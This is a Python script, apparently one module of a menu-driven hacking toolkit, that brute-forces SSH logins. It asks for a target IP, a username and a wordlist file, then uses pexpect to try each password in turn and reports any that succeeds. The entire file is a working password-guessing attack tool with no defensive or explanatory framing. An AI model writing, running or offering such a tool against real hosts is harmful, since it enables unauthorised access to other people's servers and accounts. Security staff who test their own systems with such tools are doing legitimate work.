#!/usr/bin/python

import pexpect
from c_text import *
from f_text import *

PROMPT = ['# ', '>>> ', '> ', '\$ ']

def connect(user, host, file):

	count = 0
	pw_string = ''

	for password in file.readlines():
		password = password.strip('\n')
		try:
			ssh_newkey = 'Are you sure you want to continue connecting'
			connStr = 'ssh ' + user + '@' + host
			child = pexpect.spawn(connStr)
			ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword: '])
			if ret == 0:
				print (color_red('[-] Error connecting'))
				return
			if ret == 1:
				child.sendline('yes')
				ret = child.expect([pexpect.TIMEOUT, '[P|p]assword: '])
			if ret == 0:
				print (color_red('[-] Error connecting'))
				return
			print (color_yellow(f"[*] Trying: {password}"))
			child.sendline(password)
			child.expect(PROMPT,timeout=2)
			print(color_green("[*] SSH login Success!\n[+] Password found: " + password))
			pw_string += password
			pw_string += ' '
			count += 1
			return True
		except:
			print (colored("[-] SSH login Failed", 'red'))

	print (color_red("[*] No valid password found"))

def sshb_run():
	print (standard_blue("SSH"), standard_red("Brute"))
	host = input(color_blue("[*] Enter target IP address: "))
	user = input(color_blue("[*] Enter username to brute: "))
#	file = open('passwd.txt', 'r')
	f_name = input(colored("[*] Enter local file name: ", 'blue'))
	file = open(f_name, 'r')
	connect(user, host, file)
	input(color_yellow("\n[*] Press Enter to return to main menu"))

if __name__ == '__main__':
	sshb_run()
